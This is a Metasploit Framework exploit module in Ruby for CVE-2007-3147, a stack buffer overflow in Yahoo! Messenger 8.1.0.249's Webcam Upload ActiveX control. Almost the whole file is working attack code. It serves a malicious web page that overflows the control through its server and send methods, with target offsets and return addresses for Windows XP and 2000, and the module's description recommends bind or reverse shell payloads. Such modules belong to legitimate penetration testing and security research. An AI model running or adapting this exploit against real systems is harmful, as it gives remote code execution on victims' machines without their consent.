##
# $Id: yahoomessenger_server.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Yahoo! Messenger 8.1.0.249 ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Yahoo! Webcam Upload ActiveX
				Control (ywcupl.dll) provided by Yahoo! Messenger version 8.1.0.249.
				By sending a overly long string to the "Server()" method, and then calling
				the "Send()" method, an attacker may be able to execute arbitrary code.
				Using the payloads "windows/shell_bind_tcp" and "windows/shell_reverse_tcp"
				yield for the best results.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2007-3147' ],
					[ 'OSVDB', '37082' ],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2007-June/063817.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 1032, 'Ret' => 0x71aa32ad } ],
					[ 'Windows 2000 Pro English All',       { 'Offset' => 1032, 'Ret' => 0x75022ac4 } ]
				],
			'DisclosureDate' => 'Jun 5 2007',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		sploit =  rand_text_alpha(target['Offset'] - p.encoded.length) + p.encoded
		sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')
		sploit << [0xe8, -775].pack('CV') + rand_text_alpha(500)

		# Build out the message
		content = %Q|<html>
<object classid='clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277' id='#{vname}'></object>
<script language='javascript'>
#{strname} = new String('#{sploit}')
#{vname}.server = #{strname}
#{vname}.send()
</script>
</html>
|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
